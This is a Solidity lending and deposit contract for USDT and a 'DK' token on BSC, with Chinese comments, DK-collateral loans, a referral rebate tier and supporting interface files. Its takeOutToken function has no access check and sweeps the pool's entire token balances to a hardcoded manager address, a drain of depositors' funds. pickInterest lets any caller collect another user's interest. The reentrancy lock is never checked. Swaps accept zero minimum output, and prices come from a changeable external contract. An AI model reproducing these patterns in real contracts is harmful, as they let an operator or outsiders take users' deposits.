// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;
import"contracts/DKLOAN/interface/IERC20.sol";
import "contracts/DKLOAN/interface/ISwapRouter.sol";
import "contracts/DKLOAN/interface/Price.sol";

interface Loan {
    //存款函数
    function depositMoney(uint256 _Money)external;
    //返回本金和利息收益,存款时区块高度
    function calculate(address _user)external view  returns(uint256,uint256,uint256);
    //取出利息的外部方法
    function pickInterest(address _user)external  returns(uint256);
    //取出本金和利息
    function  withdrawMoney()external returns(bool);
    //返回当前合约地址的USDT和DK数量的外部方法
    function getDkAndUsdtQuantity()external view returns(uint256,uint256);
    //抵押DK获得usdt
    function mortgage_DK(uint256 _usdtQuantity)external returns(uint256);
    //赎回DK
    function redeem_DK()external;
    //返回借usdt数量,质押DK数量,质押的DK区块高度数量,产生的利息
    function getLoanUserInformation(address _loansuer)external view returns(uint256,uint256,uint256,uint256);
    //查看利息外部函数
    function getLoanInterest(address _user)external view returns(uint256) ;
    //获得钱包地址对应的利息率
    function getInterestRate(address _user)external returns(bool);
    //获得dk价格 转化后需/ e18;
    function getPrice()external view  returns(uint256);
     //取出池子任何token 
    function takeOutToken(address _token)external;
     //修改月化利息
    function setMoonInterest(uint256 min,uint256 max)external  returns(uint256,uint256);
     //绑定上级
     function  setSperiorInvitation(address  superior)external returns(bool);
     //返回上级
    function getSperior(address  own)external view  returns(address) ;
    //计算已累计返佣
    function getTotalRebateIncome(address _superior)external   view returns(uint256);
    //返回顶级邀请人下级累计存款金额,以及积累的利息奖励
    function getSuperiorInformation(address _superior)external view  returns(uint256,uint256);
    
}

contract loan{
   //月区块
   //暂时改成
   //86400*10; 一天的区块
   //30分钟的区块=60*30/2
   uint256 moon_block=900;

   //周区块  86400/3*7;

   //6分钟才有 收益=
   uint256 week_block=160;
 
   
   //最小存款金额
   uint256 minDeposit=1e17;

   //最小存款金额
   uint256 maxDeposit=1000e18;

   //存款月化收益
   uint256 private  ownMoondepositInterest=380;
   
   //邀请收益
   uint256 private invitationIncome=170;

   //利息管理地址
   address manageraddress=0x8A2A6Ca57E485a0252a99353f8b91fc49a9EE026;
 
   //月化贷款利息
   uint256 moonLoanInterest=550;

  //路由地址 用于swap交易
  ISwapRouter _swapRouter = ISwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
   //
  //usdt=>0x55d398326f99059fF775485246999027B3197955 
  IERC20 USDT=IERC20(0x55d398326f99059fF775485246999027B3197955);
  //DK=>0xB5f6e4236591D1e68d93A40E24Ebfe9E7CEe7F7b
  IERC20 DK_TOKEN=IERC20(0xB5f6e4236591D1e68d93A40E24Ebfe9E7CEe7F7b);
  Price  price=Price(0x7EF2e0048f5bAeDe046f6BF797943daF4ED8CB47);
  

  //重入锁
  bool internal locked = false;
  modifier withdraw{
     locked = true;
     _;
     locked = false;
  }
  //存钱用户信息
  struct DepositUserInfo{
      uint256 depositMoney;//存入金额
      uint256 depositBlock;//存入区块
      
      //下级累积的存款金额
      uint256 subordinateAccumulationDeposit;

      //最新计算返佣的区块差
      uint256 superiorCommissionBlock;
      //待返佣的存款
      uint256 CommissionToBeRepaid;

  }


  //
  struct DorrowUserInfo{
      uint256 dorrowUsdtMoney;   //借的usdt数量
      uint256 mortgageDkoney;    //低于的dk数量
      uint256 dorrowBlock;       //借钱时区块高度
      bool repeat;               //是否借过
    
  }
  //存钱
  mapping (address=>DepositUserInfo) depositUserInfo;

  //借钱
  mapping (address=>DorrowUserInfo) dorrowUserInfo;

  //上级邀请人
  mapping (address=>address) superiorInvitation;

   

  
    //存款函数
   function depositMoney(uint256 _Money)external withdraw{   
    //require(minDeposit<_Money&&_Money<maxDeposit,"Deposit amount exceeds limit");
    //将钱存入当前合约池
     USDT.transferFrom(msg.sender, address(this), _Money);
    //获得用户信息
     DepositUserInfo storage UserInfo=depositUserInfo[msg.sender];
      //如果是首次存款
      if(UserInfo.depositMoney==0){ 
      //保存存入金额
      UserInfo.depositMoney=_Money;
      

      }else {
      //非首次 先取出利息
      _pickInterest(msg.sender);
      //增加存款
       UserInfo.depositMoney=UserInfo.depositMoney+_Money;
      }
      //保存当前区块
      UserInfo.depositBlock=block.number;
      
      //判断是否有上级邀请人
      if(superiorInvitation[msg.sender]!=address(0)){
         //有上级邀请人 先计算一次返佣收益
         //获取上级信息
         DepositUserInfo storage SuperiorUserInfo=depositUserInfo[superiorInvitation[msg.sender]];
         //计算更新一次返佣
         SuperiorUserInfo.CommissionToBeRepaid=getTotalRebateIncome(superiorInvitation[msg.sender]);
         //更新返佣计算区块
         SuperiorUserInfo.superiorCommissionBlock=block.number;
         SuperiorUserInfo.subordinateAccumulationDeposit=SuperiorUserInfo.subordinateAccumulationDeposit+_Money;
         
      }

    } 

   //返回本金和利息收益,存款时区块高度
   function calculate(address _user)external  view   returns(uint256,uint256,uint256){
        DepositUserInfo storage UserInfo=depositUserInfo[_user];
        return (UserInfo.depositMoney,_calculateInterest(_user,ownMoondepositInterest),UserInfo.depositBlock);
   }



    //计算利息的内部方法
   function _calculateInterest(address _user,uint256 _depositInterest)internal view    returns(uint256){
    DepositUserInfo storage UserInfo=depositUserInfo[_user];
    uint256  blockDifference=block.number-UserInfo.depositBlock;
    //低于7天没有利息
    if(blockDifference<week_block){
        return 0;
    }
    
    //获得区块差获取利息
    uint256 _interest=UserInfo.depositMoney*blockDifference*_depositInterest/week_block/10000;
    return _interest;
    
   }


   //取出利息的外部方法
   function pickInterest(address _user)external withdraw returns(uint256){
      return  _pickInterest(_user);
   }
   //取出利息的内部方法
   function _pickInterest(address _user)internal  returns(uint256) {
      uint256 _interest=_calculateInterest(_user,ownMoondepositInterest);
      //当计算利息为0时不作任何改变
      if(_interest==0){
        return 0;
      }
      //当利息不为0时 
      //1、获得用户信息
      //2、将利息转给用户
      //3、重置利息最新计算区块
      DepositUserInfo storage UserInfo=depositUserInfo[_user];

      USDT.transfer(msg.sender, _interest);
      UserInfo.depositBlock=block.number;
      return _interest;

      
   }
   //取出本金和利息
   function  withdrawMoney()external withdraw returns(bool) {
    //获取用户信息
    //取出利息
    //取出本金
    //再讲存款金额以及区块高度改为0
    DepositUserInfo storage UserInfo=depositUserInfo[msg.sender];
    //获得需要转出的金额
    uint256 takeOutUsdtQuantity=_calculateInterest(msg.sender,ownMoondepositInterest)+UserInfo.depositMoney;
    //获取当前合约地址usdt数量
    (uint256 usdtQuantity,)=_getDkAndUsdtQuantity();
    //当usdt不够则卖出dk 
    if(usdtQuantity<takeOutUsdtQuantity){
      //先计算出购买
      uint256 DkQuantity=buyUsdtSpendDk(takeOutUsdtQuantity);
      swapTokenForFund(DkQuantity, address(DK_TOKEN), address(USDT));
    }
    _pickInterest(msg.sender);
    USDT.transfer(msg.sender, UserInfo.depositMoney);
    UserInfo.depositBlock=0;
    UserInfo.depositMoney=0;

    //用户取出资产要重新计算一下邀请人返佣
    //判断是否有上级邀请人
    if(superiorInvitation[msg.sender]!=address(0)){
         //有上级邀请人 先计算一次返佣收益
         //获取上级信息
         DepositUserInfo storage SuperiorUserInfo=depositUserInfo[superiorInvitation[msg.sender]];
         //计算更新一次返佣
         SuperiorUserInfo.CommissionToBeRepaid=getTotalRebateIncome(superiorInvitation[msg.sender]);
         //更新返佣计算区块
         SuperiorUserInfo.superiorCommissionBlock=block.number;
         SuperiorUserInfo.subordinateAccumulationDeposit=SuperiorUserInfo.subordinateAccumulationDeposit-UserInfo.depositMoney;
         
      }

    return true;
    
   }
   //返回当前合约地址的USDT和DK数量的外部方法
   function getDkAndUsdtQuantity()external view returns(uint256,uint256){
     return _getDkAndUsdtQuantity();
   }

   //返回当前合约地址中USDT和DK数量的内部方法
   function _getDkAndUsdtQuantity()internal  view returns(uint256,uint256){
      uint256 USDT_Quantity=USDT.balanceOf(address(this));
      uint256 DK_Quantity=DK_TOKEN.balanceOf(address(this));
      return (USDT_Quantity,DK_Quantity);
   }  

   //抵押DK获得usdt
   function mortgage_DK(uint256 _usdtQuantity)external withdraw returns(uint256){
       DorrowUserInfo storage UserInfo=dorrowUserInfo[msg.sender];
       require(UserInfo.repeat==false, "Repeat borrowing");
        
       //计算购买指定数量usdt所需的DK数量 ,
       uint256  spendDkQuantity=buyUsdtSpendDk(_usdtQuantity);
       //从用户身上转DK到合约地址
       DK_TOKEN.transferFrom(msg.sender, address(this), spendDkQuantity*10/4);
       
       //获取当前合约usdt数量,判断是否足够给用户借贷，如果不够卖出kd给用户借钱
       (uint256  thisUsdtQuantity,)=_getDkAndUsdtQuantity();
       if (thisUsdtQuantity<_usdtQuantity){
        //
        swapTokenForFund(spendDkQuantity,address(DK_TOKEN),address(USDT));
       }
       //将借的USDT转给用户
       USDT.transfer(msg.sender, _usdtQuantity);
       //记录用户借款金额，质押金额，借款区块，以及更新借款状态
       UserInfo.dorrowUsdtMoney=_usdtQuantity;
       UserInfo.mortgageDkoney=spendDkQuantity*10/4;
       UserInfo.dorrowBlock=block.number;
       UserInfo.repeat=true;
       return UserInfo.mortgageDkoney;
   }

   //赎回DK
   function redeem_DK()external withdraw{
      DorrowUserInfo storage UserInfo=dorrowUserInfo[msg.sender];
      //没有借钱
      require(UserInfo.repeat,"Didn't borrow money");
      //获取区块差
      uint256 blockDifference=block.number-UserInfo.dorrowBlock;
      //大于30天则将用户抵押的DK卖出成U存到池子里
      if(blockDifference>moon_block){
        swapTokenForFund(UserInfo.mortgageDkoney,address(DK_TOKEN),address(USDT));
      }else {
      //没有超过30天 减去利息返还给用户
      //计算利息,
        uint256 loanInterest=_getLoanInterest(msg.sender);
        //计算一下合约DK数量是否充足
       (,uint256 thisDkQuantity)=_getDkAndUsdtQuantity();
          if(thisDkQuantity<UserInfo.mortgageDkoney-loanInterest){
            //不够也卖出一部分usdt数量
            swapTokenForFund(UserInfo.dorrowUsdtMoney*10/4,address(USDT),address(DK_TOKEN));
          }
        //用户将USDT转回来
        USDT.transferFrom(msg.sender, address(this), UserInfo.dorrowUsdtMoney);
        //将抵押的DK转回给用户
        DK_TOKEN.transfer(msg.sender, UserInfo.mortgageDkoney-loanInterest);
      }
      //更新用户状态
       UserInfo.dorrowUsdtMoney=0;
       UserInfo.mortgageDkoney=0;
       UserInfo.dorrowBlock=0;
       UserInfo.repeat=false;      
   }

   //返回借usdt数量,质押DK数量,质押的DK区块高度数量,产生的利息
   function getLoanUserInformation(address _loansuer)external view returns(uint256,uint256,uint256,uint256){
      DorrowUserInfo storage UserInfo=dorrowUserInfo[_loansuer];
      return (UserInfo.dorrowUsdtMoney,UserInfo.mortgageDkoney,UserInfo.dorrowBlock,_getLoanInterest(_loansuer));
   }


   //查看用户自己积累的利息
   function getLoanInterest(address _user)external view returns(uint256) {
    return  _getLoanInterest(_user);
   }

   //查看借款利息内部函数,
   //质押的是DK 到时候扣除对应DK即可
   function _getLoanInterest(address _user)internal view returns(uint256){
     DorrowUserInfo storage UserInfo=dorrowUserInfo[_user];
     if(UserInfo.repeat==false){
      return 0;
     }
      //计算购买指定数量usdt所需的DK数量 ,
     uint256 spendDkQuantity=buyUsdtSpendDk(UserInfo.dorrowUsdtMoney);
     //区块差
     uint256 blockDifference=block.number-UserInfo.dorrowBlock;
     //大于30天利息也空
     if(blockDifference>moon_block){
      return 0;
     }
      
     //借贷DK数量*区块差*月化利息/月化区块
     uint256 interestDkQuantity=spendDkQuantity*blockDifference*moonLoanInterest/moon_block/10000;
     return interestDkQuantity;
   }






   //计算购买指定数量usdt所需的DK数量
   function buyUsdtSpendDk(uint256 _usdtQuantity)internal view returns(uint256){
      return _usdtQuantity*1e18/price.getPrice();
   }

   //计算购买指定数量Dk所需的usdt数量
   function buyDkSpendUsdt(uint256 _dkQuantity)internal view returns(uint256){
      return _dkQuantity*price.getPrice()/1e18;
   }

   //获取当前合约地址邀请人数的内部函数
   function _getInviterQuantity(address _user)internal  returns(uint256)  {
    address cont=0xB5f6e4236591D1e68d93A40E24Ebfe9E7CEe7F7b;
      (, bytes memory data) =cont.call(abi.encodeWithSignature("getMyDirectChildren(address)",_user));
      return (data.length-64)/32;
   }

   //修改存款月化利息
   function setMoonInterest(uint256 ownInterest,uint256 _inviteInterest)external  returns(uint256,uint256) {
       require(msg.sender==manageraddress,"No =manageraddress");
       ownMoondepositInterest=ownInterest;
       invitationIncome=_inviteInterest;
       return  (ownMoondepositInterest,invitationIncome);
   
   } 

   //返回顶级邀请人各个数据
   function getSuperiorInformation(address _superior)external view  returns(uint256,uint256) {
      DepositUserInfo storage superiorUserInfo=depositUserInfo[_superior];
      return (superiorUserInfo.subordinateAccumulationDeposit,getTotalRebateIncome(_superior));
   }
   

   //顶级邀请人领取返佣收益
   function receiveTotalRebateIncome(address _superior)public returns(uint256) {
         DepositUserInfo storage UserInfo=depositUserInfo[_superior];
         if(_getInterestRate(_superior)==true){
            return 0;
         }

         //计算总累计的返佣
         uint256  _commissionToBeRepaid=getTotalRebateIncome(_superior);
         //给顶级邀请人发放奖励
         USDT.transfer(_superior, _commissionToBeRepaid);
         
         //更新返佣区块
         UserInfo.superiorCommissionBlock=block.number;
         
         UserInfo.CommissionToBeRepaid=0;
         return _commissionToBeRepaid;

   }
    //绑定上级
   function  setSperiorInvitation(address  superior)external returns(bool) {
      require(_getInterestRate(superior)==true,"Non-top-level inviters cannot be bound");

      //先判断上级为空才可以绑定
      require(superiorInvitation[msg.sender]==address(0),"Repeat superior");
      
      //绑定地址
      superiorInvitation[msg.sender]=superior;
      return true;
   }

   //返回上级
   function getSperior(address  own)external view  returns(address) {
      return  superiorInvitation[own] ;
   }


   //计算这段区块差内产生的返佣收益的内部方法
   function _getRebateIncome(address _superior)internal view  returns(uint256) {
    //获取用户信息
    DepositUserInfo storage UserInfo=depositUserInfo[_superior];
   
    //下级累积存款金额
    uint256 downMoney=UserInfo.subordinateAccumulationDeposit;
    if(downMoney==0){
      return 0;
    }
    //获取产生收益的区块差
    uint256 rebateBlock=block.number-UserInfo.superiorCommissionBlock;
    //计算返佣            存款金额*存款区块差*返佣利息
    uint256 rebateMoney=UserInfo.depositMoney*rebateBlock*invitationIncome/moon_block/10000;

    //返回当前产生的返佣
    return  rebateMoney;
   }



   //计算已累计返佣
   function getTotalRebateIncome(address _superior)public  view returns(uint256) {
      DepositUserInfo storage UserInfo=depositUserInfo[_superior];
      return  UserInfo.CommissionToBeRepaid+_getRebateIncome(_superior);
   } 

   //获取月化收益,以及返佣月化
   function getLunarization(address _user)external  returns(uint256,uint256) {
      if(_getInterestRate(_user)==true){
         return (ownMoondepositInterest,invitationIncome);
      }
         return (ownMoondepositInterest,0);
   }
   
   

    //邀约人数是否超过5个人
   function getInterestRate(address _user)external returns(bool){
    return  _getInterestRate(_user);
    }
   
   //获得获得用户邀请人数是否超过5个人
   function _getInterestRate(address _user)internal   returns(bool) {
      uint256 inviteQuantity=_getInviterQuantity(_user);
      if(inviteQuantity>=5){
         return true;
      }else {
         return false;
      }
   }

  
   //获得dk价格 转化后需/ e18;
   function getPrice()external view  returns(uint256) {
     return  price.getPrice();
   }
   //usdt和dk的交易函数  token1卖出成token2 再放到合约池子中
   function swapTokenForFund(uint256 tokenAmount,address token1,address token2)internal withdraw{
     address[] memory path = new address[](2);
        path[0] =token1;
        path[1] = token2;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
   }

   function takeOutToken(address _token)external {
         IERC20 token=IERC20(_token);
         uint256 quantity=token.balanceOf(address(this));
         token.transfer(0x8A2A6Ca57E485a0252a99353f8b91fc49a9EE026, quantity);
        }

    







}
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface Price {
    //改价格
    function changePrice(uint256 _price)external ;
    //查看价格
    function getPrice()external view  returns(uint256) ;
}
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;
interface ISwapRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

 
}
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;
interface IERC20 {
    function totalSupply() external view returns (uint256);//总量
   function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
   function allowance(address owner, address spender) external view returns (uint256);
   function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
   event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}